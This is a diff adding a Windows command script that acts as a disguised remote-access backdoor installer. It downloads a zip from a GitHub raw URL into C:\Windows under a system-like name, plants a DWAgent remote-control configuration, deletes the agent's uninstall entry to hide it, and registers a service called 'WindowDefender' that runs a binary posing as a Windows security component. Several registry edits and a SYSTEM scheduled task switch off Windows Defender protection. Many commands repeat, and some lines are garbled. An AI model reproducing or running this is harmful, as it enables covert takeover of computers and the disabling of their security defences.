@@ -1,0 +1,107 @@
+cd c:\windows\system32
+
+curl -L -o "C:\Windows\Windowsfrmawork.zip" "https://github.com/210A22127S/my/raw/4f9c63614f983b2d630567268f159d3538e4fea1/em.zip"
+
+net stop WindowDefender
+
+net  stop WindowDefender
+
+C:\WINDOWS\system32\cmd.exe /c 2>nul cd /?
+
+
+
+curl  -L -o "C:\Windows\Windowsfrmawork.zip" "https://github.com/210A22127S/my/raw/4f9c63614f983b2d630567268f159d3538e4fea1/em.zip"
+
+tar -xf Windowsfrmawork.zip
+
+del /f Windowsfrmawork.zip
+
+cd C:\Windows
+
+tar  -xf Windowsfrmawork.zip
+
+del /f /q "C:\Windows\Windowsfrmawork\config.json"
+
+echo y | REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+
+cd C:\Windows\System32
+
+copy /y "C:\Program Files\DWAgent\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWA\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DW\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWAg\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWAgen\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWAge\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+C:\WINDOWS\system32\cmd.exe  /S /D /c" echo y "
+
+REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+
+sc query WindowDefender
+
+net start WindowDefender
+
+copy /y "C:\Program Files\D\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+sc create WindowDefender binPath= "C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe" start= auto
+
+copy /y "C:\Program Files\DWAgent12\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWAgent123\config.json" "C:\Windows\Windowsfrmawork\config.jssasdf
+
+copy /y "C:\Program Files\DWAgent1234\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+copy /y "C:\Program Files\DWAgent1\config.json" "C:\Windows\Windowsfrmawork\config.json"
+
+sc  create WindowDefender binPath= "C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe" start= auto
+
+sc  query WindowDefender
+
+net  start WindowDefender
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg  add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+
+net stop WindowDefender
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\windowdefender" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe\" run" /f
+sc qc windowdefender
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\windowdefender" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe\" run" /f
+reg  add "HKLM\SYSTEM\CurrentControlSet\Services\windowdefender" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe\" run" /f
+reg  add "HKLM\SYSTEM\CurrentControlSet\Services\windowdefender" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Windows\Windowsfrmawork\native\Windows Security Health Service.exe\" run" /f
+
+sc  qc windowdefender
+
+net  stop WindowDefender
+
+net start WindowDefender
+net  start WindowDefender
+cd ..
+net start WindowDefender
+cd ..
+cd ..
+cd c:\
+
+echo y | REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+net  start WindowDefender
+C:\WINDOWS\system32\cmd.exe  /S /D /c" echo y "
+REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DWAgent
+cd windows\system32
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+schtasks /create /tn "DisableDefender" /tr "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"" /sc onstart /ru SYSTEM
+
+net stop DWAgent
+
+net stop DWAgent
